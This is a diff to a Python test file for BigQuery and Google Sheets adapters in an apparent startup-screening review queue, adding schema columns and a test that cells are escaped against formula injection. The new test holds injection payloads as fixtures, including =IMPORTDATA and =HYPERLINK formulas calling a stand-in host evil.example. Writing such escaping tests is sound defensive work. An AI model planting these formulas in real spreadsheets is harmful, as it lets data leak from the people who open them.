@@ -56,7 +56,9 @@ class FakeBigQueryClient:
         self.inserted: list[tuple[str, list[dict[str, object]]]] = []
 
     def query(self, sql: str, job_config: object | None = None) -> FakeQueryJob:
-        self.queries.append((sql, getattr(job_config, "parameters", {})))
+        metadata = dict(getattr(job_config, "parameters", {}))
+        metadata["default_dataset"] = getattr(job_config, "default_dataset", None)
+        self.queries.append((sql, metadata))
         return FakeQueryJob([{"entity_id": "ent_1", "name": "Merry AI"}])
 
     def insert_rows_json(self, table_id: str, rows: list[dict[str, object]]) -> list[object]:
@@ -82,6 +84,7 @@ def test_bigquery_structured_store_query_rows_returns_dicts() -> None:
     rows = store.query_rows(sql="select * from mother_entities", parameters={"entity_id": "ent_1"})
 
     assert rows == [{"entity_id": "ent_1", "name": "Merry AI"}]
+    assert client.queries[0][1]["default_dataset"] == "p.d"
 
 
 class FakeScalarQueryParameter:
@@ -92,8 +95,9 @@ class FakeScalarQueryParameter:
 
 
 class FakeQueryJobConfig:
-    def __init__(self, *, query_parameters: list[FakeScalarQueryParameter]) -> None:
+    def __init__(self, *, query_parameters: list[FakeScalarQueryParameter], default_dataset: str | None = None) -> None:
         self.query_parameters = query_parameters
+        self.default_dataset = default_dataset
 
 
 class FakeBigQueryModule:
@@ -113,6 +117,7 @@ def test_bigquery_job_config_uses_google_query_parameters_when_module_is_availab
 class FakeValues:
     def __init__(self) -> None:
         self.append_body: dict[str, object] | None = None
+        self.get_responses: list[dict[str, object]] = []
 
     def append(self, **kwargs: object) -> "FakeValues":
         self.append_kwargs = kwargs
@@ -123,9 +128,49 @@ class FakeValues:
         self.get_kwargs = kwargs
         return self
 
+    def update(self, **kwargs: object) -> "FakeValues":
+        self.update_kwargs = kwargs
+        self.update_body = kwargs["body"]  # type: ignore[index]
+        return self
+
     def execute(self) -> dict[str, object]:
         if hasattr(self, "get_kwargs"):
-            return {"values": [["card_id", "reviewer", "decision"], ["card_1", "boram", "advance"]]}
+            if self.get_responses:
+                return self.get_responses.pop(0)
+            return {
+                "values": [
+                    [
+                        "card_id",
+                        "entity_id",
+                        "company",
+                        "region",
+                        "industry",
+                        "total_score",
+                        "recommended_action",
+                        "queue_type",
+                        "priority_probability",
+                        "rationale",
+                        "decision",
+                        "review_memo",
+                        "reviewer",
+                    ],
+                    [
+                        "card_1",
+                        "ent_1",
+                        "Merry AI",
+                        "Jeonbuk",
+                        "Agri",
+                        "88.0",
+                        "advance",
+                        "priority",
+                        "0.77",
+                        "strong fit",
+                        "advance",
+                        "met founder",
+                        "boram",
+                    ],
+                ]
+            }
         return {"updates": {"updatedRows": 1}}
 
 
@@ -142,14 +187,106 @@ class FakeSheetsService:
 
 def test_google_sheet_review_queue_publishes_rows_and_reads_reviews() -> None:
     service = FakeSheetsService()
+    service.values_obj.get_responses.append({"values": []})
     queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")
 
-    published = queue.publish_cards(sheet_tab="ac_climate", rows=[{"card_id": "card_1", "decision": ""}])
+    published = queue.publish_cards(
+        sheet_tab="ac_climate",
+        rows=[
+            {
+                "card_id": "card_1",
+                "entity_id": "ent_1",
+                "company": "Merry AI",
+                "region": "Jeonbuk",
+                "industry": "Agri",
+                "total_score": 88.0,
+                "recommended_action": "advance",
+                "queue_type": "priority",
+                "priority_probability": 0.77,
+                "rationale": "strong fit",
+                "decision": "",
+                "review_memo": "",
+                "reviewer": "",
+            }
+        ],
+    )
     reviews = queue.read_pending_reviews(sheet_tab="ac_climate")
 
     assert published == 1
-    assert service.values_obj.append_body == {"values": [["card_1", ""]]}
-    assert reviews == [{"card_id": "card_1", "reviewer": "boram", "decision": "advance"}]
+    assert service.values_obj.update_kwargs["range"] == "ac_climate!A1:M1"
+    assert service.values_obj.append_kwargs["range"] == "ac_climate!A:M"
+    assert service.values_obj.append_body == {
+        "values": [
+            [
+                "card_1",
+                "ent_1",
+                "Merry AI",
+                "Jeonbuk",
+                "Agri",
+                88.0,
+                "advance",
+                "priority",
+                0.77,
+                "strong fit",
+                "",
+                "",
+                "",
+            ]
+        ]
+    }
+    assert reviews == [
+        {
+            "card_id": "card_1",
+            "entity_id": "ent_1",
+            "company": "Merry AI",
+            "region": "Jeonbuk",
+            "industry": "Agri",
+            "total_score": "88.0",
+            "recommended_action": "advance",
+            "queue_type": "priority",
+            "priority_probability": "0.77",
+            "rationale": "strong fit",
+            "decision": "advance",
+            "review_memo": "met founder",
+            "reviewer": "boram",
+        }
+    ]
+
+
+def test_google_sheet_review_queue_uses_raw_values_and_escapes_formula_cells() -> None:
+    service = FakeSheetsService()
+    service.values_obj.get_responses.append({"values": []})
+    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")
+
+    queue.publish_cards(
+        sheet_tab="ac_climate",
+        rows=[
+            {
+                "card_id": "card_1",
+                "entity_id": "ent_1",
+                "company": "=IMPORTDATA(\"https://evil.example\")",
+                "region": "+SUM(1,1)",
+                "industry": "-10",
+                "total_score": 88.0,
+                "recommended_action": "@hidden",
+                "queue_type": "priority",
+                "priority_probability": 0.77,
+                "rationale": "\t=HYPERLINK(\"https://evil.example\")",
+                "decision": "",
+                "review_memo": "\r=1+1",
+                "reviewer": "",
+            }
+        ],
+    )
+
+    assert service.values_obj.append_kwargs["valueInputOption"] == "RAW"
+    values = service.values_obj.append_body["values"][0]  # type: ignore[index]
+    assert values[2] == "'=IMPORTDATA(\"https://evil.example\")"
+    assert values[3] == "'+SUM(1,1)"
+    assert values[4] == "'-10"
+    assert values[6] == "'@hidden"
+    assert values[9] == "'\t=HYPERLINK(\"https://evil.example\")"
+    assert values[11] == "'\r=1+1"
 
 
 class FakeGmailMessages:
